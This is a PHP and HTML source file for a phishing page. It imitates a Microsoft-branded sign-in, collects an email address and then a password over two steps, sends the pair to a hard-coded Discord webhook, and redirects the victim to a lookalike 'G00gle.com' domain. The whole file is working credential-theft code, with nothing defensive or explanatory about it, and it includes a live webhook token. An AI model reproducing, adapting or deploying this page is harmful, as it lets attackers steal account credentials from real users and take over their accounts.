<?php

$webhook = "https://discordapp.com/api/webhooks/1502075217466491112/qyXbGqWO3-rXVoLmeekoukSTY642_ZVXj7RSjTl544oDM5mK43UlY0CcUMnJbwWC7tjd";

// default step
$step = $_POST["step"] ?? 1;

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // STEP 1   move to step 2
    if ($step == 1) {
        $step = 2;
    }

    // STEP 2   send webhook
    else if ($step == 2) {

        $input1 = trim($_POST["input1"] ?? "");
        $input2 = trim($_POST["input2"] ?? "");

        if ($input1 !== "" && $input2 !== "") {

            $message = $input1 . ":" . $input2;

            $data = ["content" => $message];

            $options = [
                "http" => [
                    "header"  => "Content-Type: application/json\r\n",
                    "method"  => "POST",
                    "content" => json_encode($data),
                ],
            ];

            $context = stream_context_create($options);
            file_get_contents($webhook, false, $context);

            // redirect after send
            header("Location:https://G00gle.com");
            exit;
        }
    }
}

?>

<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
	<link rel="stylesheet" href="style.css">
	<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3AjLz2Ze01BXCesLCvOhwrlz9qHboz6XEwQ&s">
</head>
<body style="font-family: Arial;">
<body>

<form method="POST">

<?php if ($step == 1): ?>

    <!-- STEP 1 -->
    <div class="box">
        <img src="https://aadcdn.msauthimages.net/dbd5a2dd-injh5ap8jhqmz8127-nx2otangkbxwv-yqhg081obuu/logintenantbranding/0/bannerlogo">

        <br><br><br><br>
        <h1>Enter gmail</h1>
		 <p>Your organizational policy requires you to sign in<br> again after a certain time period.</p>
		 <p><a>Forgot my password<br> Sign in with another account</a></p>

        <input type="text" name="input1" placeholder="gmail" required>
        <input type="hidden" name="step" value="1">
        <button type="submit">Next</button>
    </div>

<?php else: ?>

    <!-- STEP 2 -->
    <div class="box">
        <img src="https://aadcdn.msauthimages.net/dbd5a2dd-injh5ap8jhqmz8127-nx2otangkbxwv-yqhg081obuu/logintenantbranding/0/bannerlogo">

        <br><br><br><br>
        <h1>Enter password</h1>
		 <p>Your organizational policy requires you to sign in<br> again after a certain time period.</p>
		 <p><a>Forgot my password<br> Sign in with another account</a></p>

        <!-- IMPORTANT: correct name -->
        <input type="text" name="input2" placeholder="Password" required>

        <!-- keep input1 so it carries over -->
        <input type="hidden" name="input1" value="<?php echo htmlspecialchars($_POST['input1'] ?? ''); ?>">

        <input type="hidden" name="step" value="2">

        <button type="submit">Done</button>
    </div>

<?php endif; ?>

</form>

</body>
</html>